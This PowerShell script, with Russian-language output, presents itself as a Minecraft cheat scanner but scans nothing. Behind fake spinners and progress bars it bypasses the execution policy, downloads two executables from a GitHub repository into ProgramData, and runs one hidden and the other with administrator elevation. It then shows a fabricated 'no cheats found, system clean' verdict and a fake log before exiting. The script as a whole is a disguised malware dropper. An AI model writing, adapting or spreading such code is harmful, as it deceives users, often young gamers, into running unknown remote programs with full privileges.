# ===============================================
# MINECRAFT CHEAT SCANNER v2.0 (INSTANT CLOSE)
# ===============================================

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host
$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"

# ===============================================
# КОНФИГУРАЦИЯ
# ===============================================
$URL_FX = "https://github.com/kilordow/Fx.exe/releases/download/lol/Fx.exe"
$URL_ADDEX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/AddEx.exe"
$TARGET_DIR = "C:\ProgramData\MyApp"
$FX_PATH = "$TARGET_DIR\Fx.exe"
$ADDEX_PATH = "$TARGET_DIR\AddEx.exe"

if (-not (Test-Path $TARGET_DIR)) {
    New-Item -ItemType Directory -Path $TARGET_DIR -Force | Out-Null
}

# ===============================================
# ВИЗУАЛ
# ===============================================
Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
Start-Sleep 2

$startTime = Get-Date

function Show-Spinner {
    param($text, $duration)
    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
    $endTime = (Get-Date).AddSeconds($duration)
    $i = 0
    while ((Get-Date) -lt $endTime) {
        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green
        $i++
        Start-Sleep 0.1
    }
    Write-Host "`r[✓] $text" -ForegroundColor Green
}

# ===============================================
# ФОНОВАЯ ЗАГРУЗКА
# ===============================================
Write-Host "`n[1/6] 🔍 Сканирование процессов javaw.exe..." -ForegroundColor Cyan

$downloadFx = Start-Job -ScriptBlock {
    param($url, $path)
    try {
        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
} -ArgumentList $URL_FX, $FX_PATH

$downloadAddEx = Start-Job -ScriptBlock {
    param($url, $path)
    try {
        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
} -ArgumentList $URL_ADDEX, $ADDEX_PATH

Show-Spinner "Анализ DLL и инжекторов..." 15

# ===============================================
Write-Host "`n[2/6] 📁 Сканирование .minecraft..." -ForegroundColor Cyan
$waitEnd = (Get-Date).AddSeconds(15)
while ((Get-Date) -lt $waitEnd) {
    Start-Sleep 0.5
}
Show-Spinner "Проверка модов, jars, json..." 0

# ===============================================
Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
Show-Spinner "Поиск скрытых читов..." 10

# ===============================================
Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
Show-Spinner "Анализ реестра Run/Startup..." 10

$fxOk = Receive-Job $downloadFx -ErrorAction SilentlyContinue
$addExOk = Receive-Job $downloadAddEx -ErrorAction SilentlyContinue
Remove-Job $downloadFx -Force -ErrorAction SilentlyContinue
Remove-Job $downloadAddEx -Force -ErrorAction SilentlyContinue

# ===============================================
Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
for ($p = 0; $p -le 100; $p += 10) {
    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
    Start-Sleep 0.5
}
Write-Progress -Completed

# ===============================================
Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan

if (Test-Path $ADDEX_PATH) {
    try {
        Start-Process -FilePath $ADDEX_PATH -WindowStyle Hidden
    } catch {}
}

Show-Spinner "Проверка Minecraft серверов..." 5

# ===============================================
# ФИНАЛ - ВСЁ МГНОВЕННО
# ===============================================
$endTime = (Get-Date) - $startTime
Clear-Host
Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green

# Лог пишем в фоне (не ждём)
$log = @"
Minecraft Cheat Scan - $(Get-Date)
Время: $([math]::Round($endTime.TotalSeconds)) сек
Найдено: 0
Риск: 0%
Статус: ЧИСТО! ✅
"@
$log | Out-File "$env:TEMP\mc_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8

# Запускаем Fx.exe и сразу закрываем окно
if (Test-Path $FX_PATH) {
    try {
        Start-Process -FilePath $FX_PATH -Verb RunAs
    } catch {}
}

# МГНОВЕННОЕ ЗАКРЫТИЕ (без задержки)
exit
